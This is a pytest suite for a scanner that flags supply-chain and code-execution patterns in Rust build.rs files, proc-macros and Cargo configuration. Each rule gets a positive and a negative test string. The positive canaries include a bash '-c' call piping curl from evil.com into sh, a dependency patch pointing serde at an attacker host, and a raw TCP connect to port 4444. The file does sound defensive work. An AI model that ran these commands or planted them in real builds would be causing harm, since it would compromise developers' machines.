"""Tests for scripts/lib/cargo_build_rs_patterns.py.

Pattern-coverage tests for the Wave-36 distill-round-22 Rust cargo
build.rs + proc-macro RCE catalogue (15 rules, crg- prefix). Each rule
has exactly two tests: one positive (canary MUST match) and one negative
(safe variant MUST NOT match).
"""

from __future__ import annotations

import sys
from pathlib import Path

_PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_PROJECT_ROOT / "scripts" / "lib"))

import cargo_build_rs_patterns as crg  # type: ignore[import-not-found]  # noqa: E402

# ---------- Data-model sanity --------------------------------------------


def test_rules_tuple_contains_every_advertised_rule() -> None:
    """RULES must expose all 15 documented crg- rule IDs."""
    assert isinstance(crg.RULES, tuple)
    rule_ids = {r.id for r in crg.RULES}
    expected = {
        "crg-command-new-env-var",
        "crg-command-new-env-var-runtime",
        "crg-network-fetch-crate",
        "crg-network-tcpstream",
        "crg-outdir-write-env",
        "crg-outdir-write-format",
        "crg-proc-macro-fs-access",
        "crg-proc-macro-env-path",
        "crg-patch-crates-io",
        "crg-git-dep-non-https",
        "crg-path-dep-traversal",
        "crg-target-runner-string",
        "crg-target-runner-array",
        "crg-shell-command-new",
        "crg-shell-arg-c",
    }
    assert expected == rule_ids
    assert len(crg.RULES) == 15


def test_every_rule_has_valid_owasp_and_severity() -> None:
    """Every rule maps to a valid ASI- prefix and a known severity."""
    for rule in crg.RULES:
        assert rule.owasp_asi.startswith("ASI-"), rule.id
        assert rule.severity in {"CRITICAL", "HIGH", "MEDIUM", "LOW"}, rule.id
        assert rule.description.strip(), rule.id
        assert rule.name.strip(), rule.id


def test_finding_named_tuple_shape() -> None:
    """Finding must have all seven required fields."""
    f = crg.Finding(
        rule_id="crg-shell-command-new",
        line=1,
        column=0,
        matched_text='Command::new("sh")',
        severity="CRITICAL",
        description="test",
        owasp_asi="ASI-05",
    )
    assert f.rule_id == "crg-shell-command-new"
    assert f.severity == "CRITICAL"
    assert f.owasp_asi == "ASI-05"


def test_scan_text_returns_list() -> None:
    """scan_text on empty input returns an empty list."""
    result = crg.scan_text("")
    assert isinstance(result, list)
    assert result == []


# ---------- crg-command-new-env-var --------------------------------------


def test_crg_command_new_env_var_positive() -> None:
    """build.rs Command::new with env! macro argument triggers the rule."""
    code = 'let out = Command::new(env!("MY_BUILD_TOOL")).status().unwrap();'
    findings = crg.scan_text(code)
    ids = [f.rule_id for f in findings]
    assert "crg-command-new-env-var" in ids


def test_crg_command_new_env_var_negative() -> None:
    """Command::new with a string literal does NOT trigger env-macro rule."""
    code = 'let out = Command::new("gcc").arg("-o").arg("foo").status()?;'
    findings = crg.scan_text(code)
    ids = [f.rule_id for f in findings]
    assert "crg-command-new-env-var" not in ids


# ---------- crg-command-new-env-var-runtime ------------------------------


def test_crg_command_new_env_var_runtime_positive() -> None:
    """Command::new(env::var(...)) runtime lookup triggers the rule."""
    code = 'Command::new(env::var("BUILD_TOOL").unwrap()).spawn()?;'
    findings = crg.scan_text(code)
    ids = [f.rule_id for f in findings]
    assert "crg-command-new-env-var-runtime" in ids


def test_crg_command_new_env_var_runtime_negative() -> None:
    """env::var used only to read a flag (not fed to Command::new) is safe."""
    code = 'let verbose = env::var("VERBOSE").is_ok();'
    findings = crg.scan_text(code)
    ids = [f.rule_id for f in findings]
    assert "crg-command-new-env-var-runtime" not in ids


# ---------- crg-network-fetch-crate --------------------------------------


def test_crg_network_fetch_crate_positive() -> None:
    """reqwest::blocking usage in build.rs triggers the network fetch rule."""
    code = "let resp = reqwest::blocking::get(url).unwrap();"
    findings = crg.scan_text(code)
    ids = [f.rule_id for f in findings]
    assert "crg-network-fetch-crate" in ids


def test_crg_network_fetch_crate_negative() -> None:
    """A comment mentioning reqwest without a call does not trigger the rule."""
    code = "// TODO: consider reqwest for future use"
    findings = crg.scan_text(code)
    ids = [f.rule_id for f in findings]
    assert "crg-network-fetch-crate" not in ids


# ---------- crg-network-tcpstream ----------------------------------------


def test_crg_network_tcpstream_positive() -> None:
    """TcpStream::connect in build.rs triggers the raw TCP rule."""
    code = 'let stream = TcpStream::connect("192.168.1.1:4444")?;'
    findings = crg.scan_text(code)
    ids = [f.rule_id for f in findings]
    assert "crg-network-tcpstream" in ids


def test_crg_network_tcpstream_negative() -> None:
    """A doc-comment reference to TcpStream without a connect call is safe."""
    code = "/// See [`TcpStream`] for connection handling."
    findings = crg.scan_text(code)
    ids = [f.rule_id for f in findings]
    assert "crg-network-tcpstream" not in ids


# ---------- crg-outdir-write-env -----------------------------------------


def test_crg_outdir_write_env_positive() -> None:
    """fs::write with env::var() in the path argument triggers the rule."""
    code = 'fs::write(env::var("OUT_DIR").unwrap() + "/evil.so", payload)?;'
    findings = crg.scan_text(code)
    ids = [f.rule_id for f in findings]
    assert "crg-outdir-write-env" in ids


def test_crg_outdir_write_env_negative() -> None:
    """fs::write with a plain string path does not trigger env-write rule."""
    code = 'fs::write("output/bindings.rs", bindings_code)?;'
    findings = crg.scan_text(code)
    ids = [f.rule_id for f in findings]
    assert "crg-outdir-write-env" not in ids


# ---------- crg-outdir-write-format --------------------------------------


def test_crg_outdir_write_format_positive() -> None:
    """fs::write(format!(...)) triggers the format-path write rule."""
    code = 'fs::write(format!("{}/{}", out_dir, crate_name), data)?;'
    findings = crg.scan_text(code)
    ids = [f.rule_id for f in findings]
    assert "crg-outdir-write-format" in ids


def test_crg_outdir_write_format_negative() -> None:
    """File::create with a constant path does not trigger format-path rule."""
    code = 'let f = File::create("src/generated.rs")?;'
    findings = crg.scan_text(code)
    ids = [f.rule_id for f in findings]
    assert "crg-outdir-write-format" not in ids


# ---------- crg-proc-macro-fs-access -------------------------------------


def test_crg_proc_macro_fs_access_positive() -> None:
    """std::fs::read in proc-macro src/lib.rs triggers the FS access rule."""
    code = "let contents = std::fs::read_to_string(path).unwrap();"
    findings = crg.scan_text(code)
    ids = [f.rule_id for f in findings]
    assert "crg-proc-macro-fs-access" in ids


def test_crg_proc_macro_fs_access_negative() -> None:
    """A comment mentioning std::fs does not trigger the FS access rule."""
    code = "// std::fs operations are forbidden in proc-macros"
    findings = crg.scan_text(code)
    ids = [f.rule_id for f in findings]
    assert "crg-proc-macro-fs-access" not in ids


# ---------- crg-proc-macro-env-path --------------------------------------


def test_crg_proc_macro_env_path_positive() -> None:
    """env!(\"HOME\") in a proc-macro triggers the env-path rule."""
    code = 'let home = env!("HOME");'
    findings = crg.scan_text(code)
    ids = [f.rule_id for f in findings]
    assert "crg-proc-macro-env-path" in ids


def test_crg_proc_macro_env_path_negative() -> None:
    """env!(\"CARGO_PKG_NAME\") is a build metadata var, not a path secret."""
    code = 'let name = env!("CARGO_PKG_NAME");'
    findings = crg.scan_text(code)
    ids = [f.rule_id for f in findings]
    assert "crg-proc-macro-env-path" not in ids


# ---------- crg-patch-crates-io ------------------------------------------


def test_crg_patch_crates_io_positive() -> None:
    """[patch.crates-io] section in Cargo.toml triggers the hijack rule."""
    code = "[patch.crates-io]\nserde = { git = \"https://attacker.example.com/serde\" }"
    findings = crg.scan_text(code)
    ids = [f.rule_id for f in findings]
    assert "crg-patch-crates-io" in ids


def test_crg_patch_crates_io_negative() -> None:
    """A plain [dependencies] section does not trigger the patch rule."""
    code = "[dependencies]\nserde = { version = \"1\", features = [\"derive\"] }"
    findings = crg.scan_text(code)
    ids = [f.rule_id for f in findings]
    assert "crg-patch-crates-io" not in ids


# ---------- crg-git-dep-non-https ----------------------------------------


def test_crg_git_dep_non_https_positive() -> None:
    """git = \"git://...\" dependency triggers the non-HTTPS rule."""
    code = 'my-crate = { git = "git://github.com/evil/crate.git" }'
    findings = crg.scan_text(code)
    ids = [f.rule_id for f in findings]
    assert "crg-git-dep-non-https" in ids


def test_crg_git_dep_non_https_negative() -> None:
    """git = \"https://...\" HTTPS dependency is safe and should not match."""
    code = 'my-crate = { git = "https://github.com/legit/crate.git" }'
    findings = crg.scan_text(code)
    ids = [f.rule_id for f in findings]
    assert "crg-git-dep-non-https" not in ids


# ---------- crg-path-dep-traversal ---------------------------------------


def test_crg_path_dep_traversal_positive() -> None:
    """path = \"../../...\" with two or more traversals triggers the rule."""
    code = 'evil-crate = { path = "../../outside/workspace/evil" }'
    findings = crg.scan_text(code)
    ids = [f.rule_id for f in findings]
    assert "crg-path-dep-traversal" in ids


def test_crg_path_dep_traversal_negative() -> None:
    """path = \"../sibling\" single traversal is normal workspace usage."""
    code = 'local-crate = { path = "../my-local-crate" }'
    findings = crg.scan_text(code)
    ids = [f.rule_id for f in findings]
    assert "crg-path-dep-traversal" not in ids


# ---------- crg-target-runner-string -------------------------------------


def test_crg_target_runner_string_positive() -> None:
    """runner = \"wine\" in config.toml triggers the target runner rule."""
    code = '[target.x86_64-pc-windows-gnu]\nrunner = "wine"'
    findings = crg.scan_text(code)
    ids = [f.rule_id for f in findings]
    assert "crg-target-runner-string" in ids


def test_crg_target_runner_string_negative() -> None:
    """A runner key with an empty string does not match (length guard)."""
    # The pattern requires at least 2 chars inside the quotes.
    code = 'runner = "x"'
    findings = crg.scan_text(code)
    ids = [f.rule_id for f in findings]
    assert "crg-target-runner-string" not in ids


# ---------- crg-target-runner-array --------------------------------------


def test_crg_target_runner_array_positive() -> None:
    """runner = [\"qemu-arm\", \"-L\", ...] array form triggers the rule."""
    code = 'runner = ["qemu-arm", "-L", "/usr/arm-linux/"]'
    findings = crg.scan_text(code)
    ids = [f.rule_id for f in findings]
    assert "crg-target-runner-array" in ids


def test_crg_target_runner_array_negative() -> None:
    """A key named 'linker' with an array value does not match runner rule."""
    code = 'linker = ["arm-linux-gnueabihf-gcc"]'
    findings = crg.scan_text(code)
    ids = [f.rule_id for f in findings]
    assert "crg-target-runner-array" not in ids


# ---------- crg-shell-command-new ----------------------------------------


def test_crg_shell_command_new_positive() -> None:
    """Command::new(\"bash\") in build.rs triggers the shell command rule."""
    code = 'Command::new("bash").arg("-c").arg("curl http://evil.com | sh").status()?;'
    findings = crg.scan_text(code)
    ids = [f.rule_id for f in findings]
    assert "crg-shell-command-new" in ids


def test_crg_shell_command_new_negative() -> None:
    """Command::new(\"make\") spawning a build tool is not a shell pattern."""
    code = 'Command::new("make").arg("all").status()?;'
    findings = crg.scan_text(code)
    ids = [f.rule_id for f in findings]
    assert "crg-shell-command-new" not in ids


# ---------- crg-shell-arg-c ----------------------------------------------


def test_crg_shell_arg_c_positive() -> None:
    """.arg(\"-c\") following a command builder triggers the sh-eval rule."""
    code = 'cmd.arg("-c").arg(payload);'
    findings = crg.scan_text(code)
    ids = [f.rule_id for f in findings]
    assert "crg-shell-arg-c" in ids


def test_crg_shell_arg_c_negative() -> None:
    """.arg(\"-v\") verbose flag does not trigger the -c eval rule."""
    code = 'cmd.arg("-v").status()?;'
    findings = crg.scan_text(code)
    ids = [f.rule_id for f in findings]
    assert "crg-shell-arg-c" not in ids
